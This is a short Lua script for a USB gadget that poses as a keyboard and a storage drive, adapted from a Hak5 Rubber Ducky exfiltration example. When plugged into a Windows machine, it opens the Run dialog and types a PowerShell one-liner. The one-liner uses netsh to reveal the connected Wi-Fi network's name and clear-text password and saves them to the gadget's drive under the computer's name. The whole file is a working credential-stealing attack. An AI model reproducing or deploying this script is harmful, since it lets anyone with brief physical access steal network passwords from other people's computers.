---
--- Copy a file from the system to a mass storage gadget
--- https://docs.hak5.org/hak5-usb-rubber-ducky/advanced-features/exfiltration
---

require('common')

kb = luausb.create({ id = 0, type = "keyboard"}, {id = 0, type = "storage" })

local LABEL = "COMPOSITE" -- label of the drive (as assigned by you)

while true do
    print("idle")

    -- poll until usb plugged in
    while luausb.state() == "not attached" do
        wait(1000)
    end

    print("running")

    wait_for_detect(kb)

    kb:chord(MOD_LSUPER, KEY_R)
    wait(1000)
    kb:string("powershell \"$m=(Get-Volume -FileSystemLabel '" .. LABEL .. "').DriveLetter;"
              .. "netsh wlan show profile name=(Get-NetConnectionProfile).Name key="
              .. "clear|?{$_-match'SSID n|Key C'}|%{($_ -split':')[1]}>>$m':\\'$env:"
              .. "computername'.txt'\"\n")

    print("done")
    -- poll until usb unplugged
    while luausb.state() == "configured" do
        wait(1000)
    end
    print("disconnected")
end

